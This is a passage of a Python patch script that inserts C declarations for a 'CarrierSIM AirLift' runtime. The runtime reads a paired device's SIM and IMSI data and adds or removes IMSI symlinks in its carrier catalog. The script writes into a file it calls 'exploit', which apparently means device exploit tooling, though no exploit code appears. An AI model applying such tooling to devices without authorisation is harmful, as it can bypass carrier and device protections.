// ---------------------------------------------------------------------------

// Read SIM rows (including IMSI) and basic device information as JSON.
int32_t al_carriersim_status(const char *pairing_path,
                             ALLogCallback log_cb,
                             void *ctx,
                             char **out_json,
                             char **out_error);

// Transactionally add/replace one root IMSI symlink in the carrier catalog.
// bundle is the system bundle leaf without or with the .bundle suffix.
int32_t al_carriersim_apply(const char *pairing_path,
                            const char *imsi,
                            const char *bundle,
                            ALLogCallback log_cb,
                            void *ctx,
                            char **out_json,
                            char **out_error);

// Remove one IMSI alias. Pass an empty imsi string to remove every root-level
// 15-digit IMSI symlink while preserving every other carrier catalog node.
int32_t al_carriersim_restore(const char *pairing_path,
                              const char *imsi,
                              ALLogCallback log_cb,
                              void *ctx,
                              char **out_json,
                              char **out_error);

'''

header_marker = "// ---------------------------------------------------------------------------\n// Syslog Stream / Live Card Detection"
if header_marker not in header_text:
    raise SystemExit("airlift.h insertion marker not found")
header_text = header_text.replace(header_marker, header_ffi + header_marker, 1)

exploit.write_text(exploit_text)
lib.write_text(lib_text)
header.write_text(header_text)

print("CarrierSIM AirLift runtime patch applied")
